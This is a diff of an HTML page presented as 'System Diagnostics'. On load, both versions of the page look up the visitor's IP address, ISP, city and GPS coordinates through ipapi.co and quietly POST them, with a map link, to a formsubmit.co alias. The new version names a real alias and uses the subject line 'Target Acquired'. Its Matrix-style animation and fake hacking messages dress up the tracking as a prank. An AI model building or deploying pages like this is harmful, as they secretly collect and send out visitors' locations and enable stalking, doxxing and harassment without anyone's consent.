@@ -1,59 +1,105 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>System Diagnostics</title>
+    <title>SYSTEM_DIAGNOSTICS</title>
     <style>
-        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', Courier, monospace; padding: 50px; line-height: 1.6; }
-        .console { border: 1px solid #333; padding: 20px; background: #000; box-shadow: 0 0 20px rgba(0, 255, 0, 0.1); max-width: 600px; margin: 0 auto; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        h2 { border-bottom: 1px solid #00ff00; padding-bottom: 10px; }
-        .label { color: #888; }
+        body, html { margin: 0; padding: 0; background: black; overflow: hidden; font-family: 'Courier New', monospace; }
+        canvas { position: absolute; top: 0; left: 0; z-index: 1; opacity: 0.3; }
+        .console {
+            position: relative; z-index: 2; color: #00ff00;
+            padding: 30px; background: rgba(0, 0, 0, 0.85);
+            border: 1px solid #00ff00; margin: 50px auto;
+            max-width: 700px; box-shadow: 0 0 20px #00ff00;
+            height: 450px; overflow-y: hidden;
+            text-shadow: 0 0 5px #00ff00;
+        }
+        .line { margin-bottom: 4px; white-space: pre-wrap; font-size: 14px; }
+        .blue { color: #00ccff; text-shadow: 0 0 5px #00ccff; }
+        .red { color: #ff3333; text-shadow: 0 0 5px #ff3333; }
     </style>
 </head>
 <body>
 
-<div class="console">
-    <h2>> SYSTEM_SCAN_STARTING...</h2>
-    <p><span class="label">Status:</span> CONNECTED <span class="blink">_</span></p>
-    <hr>
-    <p><span class="label">IPv4_ADDRESS:</span> <span id="ip">Scanning...</span></p>
-    <p><span class="label">ISP_PROVIDER:</span> <span id="isp">Scanning...</span></p>
-    <p><span class="label">LOCATION:</span> <span id="location">Scanning...</span></p>
-    <p><span class="label">COORDINATES:</span> <span id="coords">Scanning...</span></p>
-    <p><span class="label">BROWSER_ENGINE:</span> <span id="browser">Scanning...</span></p>
-    <hr>
-    <p style="font-size: 0.8em; color: #444;">DATA_SYNC_COMPLETE // SESSION_LOGGED</p>
+<canvas id="matrix"></canvas>
+
+<div class="console" id="console">
+    <div class="line">> [SYSTEM] BOOTING_CORE_FRMWK...</div>
 </div>
 
 <script>
-    // 1. Get detailed data from the API
-    fetch('https://ipapi.co/json/')
-    .then(response => response.json())
-    .then(data => {
-        // Update the screen for the visitor
-        document.getElementById('ip').innerText = data.ip;
-        document.getElementById('isp').innerText = data.org;
-        document.getElementById('location').innerText = `${data.city}, ${data.region} (${data.country_name})`;
-        document.getElementById('coords').innerText = `${data.latitude}, ${data.longitude}`;
-        document.getElementById('browser').innerText = navigator.platform;
+    // --- 1. THE MATRIX BACKGROUND ---
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const letters = "0101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const fontSize = 16;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
+    function draw() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
+        for (let i = 0; i < drops.length; i++) {
+            const text = letters[Math.floor(Math.random() * letters.length)];
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        }
+    }
+    setInterval(draw, 35);
 
-        // 2. Send the full report to your Email
-        fetch("https://formsubmit.co/ajax/YOUR_EMAIL_HERE", {
+    // --- 2. THE FAST CONSOLE SCRIPT ---
+    const consoleBox = document.getElementById('console');
+    function addLine(text, type = "") {
+        const div = document.createElement('div');
+        div.className = "line " + type;
+        div.innerText = "> " + text;
+        consoleBox.appendChild(div);
+        consoleBox.scrollTop = consoleBox.scrollHeight;
+    }
+
+    // --- 3. THE "PULL" & EMAIL LOGIC ---
+    fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+        const hackerLines = [
+            "ESTABLISHING_ENCRYPTED_LINK...",
+            "BYPASSING_ISP_GATEWAY...",
+            "INJECTING_PACKET_SNIFFER...",
+            `NETWORK_FOUND: ${data.org}`,
+            `GEO_LOCK: ${data.latitude}, ${data.longitude}`,
+            `TARGET_CITY: ${data.city}`,
+            "EXTRACTING_BROWSER_METADATA...",
+            "LOGGING_SESSION_TO_REMOTE_DB...",
+            "SUCCESS: TARGET_DETAILS_UPLOADED.",
+            "SHUTTING_DOWN_TRACE..."
+        ];
+
+        let i = 0;
+        const speed = 150; // Super fast script speed
+        const interval = setInterval(() => {
+            if (i < hackerLines.length) {
+                addLine(hackerLines[i], i > 2 && i < 7 ? "blue" : "");
+                i++;
+            } else {
+                clearInterval(interval);
+            }
+        }, speed);
+
+        // SEND TO YOUR HIDDEN ALIAS (jabuvo)
+        // Note: Using the /ajax/ version of your alias
+        fetch("https://formsubmit.co/ajax/jabuvo", {
             method: "POST",
             headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
             body: JSON.stringify({
-                IP: data.ip,
+                _subject: "🎯 Target Acquired: " + data.ip,
+                IP_Address: data.ip,
                 ISP: data.org,
-                City: data.city,
-                Region: data.region,
+                Location: `${data.city}, ${data.region}`,
                 GPS: `${data.latitude}, ${data.longitude}`,
-                Map_Link: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
+                Map: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
             })
         });
     });
 </script>
-
 </body>
 </html>
